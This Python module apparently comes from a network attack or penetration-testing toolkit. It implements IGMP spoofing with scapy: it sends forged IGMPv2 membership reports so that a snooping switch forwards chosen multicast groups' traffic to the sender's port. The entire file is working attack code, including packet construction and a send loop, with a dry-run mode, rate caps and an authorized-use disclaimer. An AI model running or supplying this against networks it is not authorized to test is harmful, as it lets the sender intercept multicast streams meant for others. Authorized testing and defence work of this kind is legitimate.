"""IGMP spoofing: send membership reports for multicast groups the sender has not joined.

A host joins a multicast group by sending an IGMP membership report for it. Snooping
switches use those reports to decide which ports receive the group's traffic. The reports
are not authenticated, so a host that sends a report for a group adds its own port to that
group, and receives the stream for that group.

This module sends IGMPv2 membership reports (RFC 2236) for the groups the operator gives.
Each report goes from the operator's MAC to the group's MAC (01:00:5e, the low 23 bits of the
group address), with TTL 1 and the router-alert option. The effect to measure is whether the
switch delivers the group's traffic to the port the reports came from.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import IGMP, IP, Ether, sendp
from scapy.layers.inet import IPOption_Router_Alert
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

MAX_GROUPS = 50
MAX_REPORTS = 100                       # reports per group
IGMP_V2_REPORT = 0x16
MULTICAST_NET = ipaddress.IPv4Network("224.0.0.0/4")
LOCAL_CONTROL_NET = ipaddress.IPv4Network("224.0.0.0/24")   # never joined by hosts for data


def group_mac(group: str) -> str:
    """The Ethernet address for an IPv4 multicast group: 01:00:5e and the low 23 bits."""
    value = int(ipaddress.IPv4Address(group)) & 0x7FFFFF
    return "01:00:5e:{:02x}:{:02x}:{:02x}".format((value >> 16) & 0x7F, (value >> 8) & 0xFF, value & 0xFF)


def validate_group(group: str) -> str:
    """Return the group address if it is a multicast address outside the local control range."""
    try:
        address = ipaddress.IPv4Address(group)
    except ValueError as exc:
        raise ValueError(f"Group {group!r} is not an IPv4 address.") from exc
    if address not in MULTICAST_NET:
        raise ValueError(f"Group {group} is not an IPv4 multicast address (224.0.0.0/4).")
    if address in LOCAL_CONTROL_NET:
        raise ValueError(f"Group {group} is in the local control range 224.0.0.0/24.")
    return group


@dataclass(frozen=True)
class IgmpSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the switch
    source_mac: str                     # the sender's MAC (required)
    groups: tuple[str, ...]             # multicast groups to join, IPv4 addresses
    source_ip: str = "0.0.0.0"          # the sender's IP; 0.0.0.0 for an unnumbered host
    reports: int = 1                    # reports per group
    dry_run: bool = False               # build reports but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        try:
            ipaddress.IPv4Address(self.source_ip)
        except ValueError as exc:
            raise ValueError("Source address must be an IPv4 address (or 0.0.0.0).") from exc
        if not self.groups:
            raise ValueError("At least one multicast group is required.")
        if len(self.groups) > MAX_GROUPS:
            raise ValueError(f"At most {MAX_GROUPS} groups per run.")
        for group in self.groups:
            validate_group(group)
        if not 1 <= self.reports <= MAX_REPORTS:
            raise ValueError(f"Reports per group must be between 1 and {MAX_REPORTS}.")


@dataclass
class IgmpSpoofingStats:
    reports: int = 0
    status: str = ""


def build_report(source_mac: str, source_ip: str, group: str) -> Packet:
    """IGMPv2 membership report for one group, with the router-alert option and TTL 1."""
    return (
        Ether(src=normalize_unicast_mac(source_mac), dst=group_mac(group))
        / IP(src=source_ip, dst=group, ttl=1, proto=2, options=[IPOption_Router_Alert()])
        / IGMP(type=IGMP_V2_REPORT, mrcode=0, gaddr=group)
    )


def run_igmp_spoofing(
    config: IgmpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[IgmpSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> IgmpSpoofingStats:
    """Send the reports, `reports` per group, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        total = len(config.groups) * config.reports
        stats = IgmpSpoofingStats(
            status=(
                f"Dry run: would send {total} IGMP membership report(s) for {len(config.groups)} group(s). "
                "Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = IgmpSpoofingStats()
    for group in config.groups:
        for _ in range(config.reports):
            if stop_event.is_set():
                return stats
            send(build_report(config.source_mac, config.source_ip, group), iface=config.iface, verbose=False)
            stats.reports += 1
            on_progress(replace(stats))
    return stats
